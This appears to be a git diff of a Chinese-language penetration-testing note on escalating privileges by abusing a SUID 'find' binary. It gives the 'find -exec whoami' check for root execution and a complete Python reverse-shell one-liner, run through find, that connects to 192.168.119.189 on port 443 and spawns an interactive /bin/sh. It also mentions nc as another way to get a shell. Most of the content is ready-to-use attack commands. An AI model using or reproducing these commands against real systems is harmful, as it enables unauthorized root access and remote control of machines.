@@ -1,7 +1,8 @@
 # 确认 find 有 root 执行权限
 执行命令
 ```
-/usr/bin/find /tmp -exec whoami \;
+touch jewel591
+/usr/bin/find jewel591 -exec whoami \;
 ```
 确认 find 命令是否是 root 权限执行.
 
@@ -13,7 +14,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 结合 find :
 ```
-/usr/bin/find /tmp -exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.189",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \; 
+/usr/bin/find jewel591 -exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.189",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \; 
 
 ```
 2. 也可以结合 nc 来获得 shell
